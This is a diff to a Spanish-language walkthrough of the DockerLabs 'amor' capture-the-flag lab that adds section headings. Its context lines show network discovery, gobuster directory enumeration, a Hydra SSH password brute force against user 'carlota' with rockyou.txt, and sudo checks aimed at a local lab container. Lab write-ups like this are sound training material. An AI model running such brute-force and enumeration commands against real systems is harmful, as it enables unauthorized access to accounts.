@@ -29,7 +29,7 @@ Este laboratorio forma parte de la plataforma DockerLabs y corresponde a un reto
    
 ## RTA. 🚚 Despliegue del Laboratorio
 🚚 Despliegue del Laboratorio
-Transferir los archivos del reto:
+## a.Transferir los archivos del reto:
 
 
 scp -r amor kali@192.168.1.12:/home/kali/Documents/
@@ -47,7 +47,7 @@ Obtener interfaz:
 
 
 ip add
-Descubrimiento de red:
+## b.Descubrimiento de red:
 
 
 sudo netdiscover -i docker0 -r 172.17.0.0/24
@@ -63,7 +63,7 @@ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-l
 🔐 Ataque por Fuerza Bruta
 Usuarios encontrados en el HTML del sitio: carlota y juan.
 
-Ataque SSH usando Hydra:
+## c. Ataque SSH usando Hydra:
 
 hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
 Accedemos vía SSH:
@@ -97,7 +97,7 @@ Accedemos como otro usuario:
 
 
 su oscar
-Comprobamos acceso con sudo:
+## d.Comprobamos acceso con sudo:
 
 
 sudo -l
